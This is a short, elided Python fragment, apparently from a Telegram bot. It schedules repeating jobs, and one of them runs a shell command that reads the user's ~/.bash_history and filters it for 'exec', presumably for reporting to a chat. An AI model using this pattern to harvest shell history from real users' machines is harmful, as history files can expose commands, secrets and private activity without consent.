...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    context.job_queue.run_repeating(send_update, interval=60, first=0, chat_id=chat_id)
    context.job_queue.run_repeating(confirm, interval=90, first=0, chat_id=chat_id)
...
async def send_update(context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        result_history = subprocess.run('cat /home/$USER/.bash_history | grep exec', shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
